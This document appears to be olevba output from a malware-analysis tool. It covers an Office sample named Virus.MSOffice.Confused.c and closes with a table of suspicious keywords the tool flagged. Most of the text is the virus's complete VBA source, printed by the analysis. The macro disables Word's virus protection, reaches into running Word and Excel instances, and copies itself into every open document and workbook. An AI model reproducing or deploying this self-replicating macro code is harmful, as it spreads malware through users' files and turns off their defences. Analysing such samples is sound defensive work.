olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused.c-a0b87d9594b9e2f4354b29d20e46890d8d816a63
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Confused.c-a0b87d9594b9e2f4354b29d20e46890d8d816a63 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Confused ][
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Application.EnableCancelKey = 0
Set Ј\ = VBProject.VBComponents("ThisDocument").CodeModule: Јf = Ј\.Lines(1, Ј\.CountOfLines + 1)
Err.Clear: Set Јo = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If Јo.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then Јo.InsertLines Јo.CountOfLines + 1, Јf
For Јd = 1 To Documents.Count
Set Јo = Documents(Јd).VBProject.VBComponents(Ј\).CodeModule
If Јo.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then
Јo.InsertLines Јo.CountOfLines + 1, Јf
End If: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.EnableCancelKey = 0
Set Ј\ = VBProject.VBComponents("ThisWorkbook").CodeModule: Јf = Ј\.Lines(1, Ј\.CountOfLines + 1)
Err.Clear: Set Јo = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If Јo.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then Јo.InsertLines Јo.CountOfLines + 1, Јf
For Јd = 1 To Workbooks.Count
Set Јo = Workbooks(Јd).VBProject.VBComponents(Ј\).CodeModule
If Јo.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then
Јo.InsertLines Јo.CountOfLines + 1, Јf
End If: Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Confused.c-a0b87d9594b9e2f4354b29d20e46890d8d816a63 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

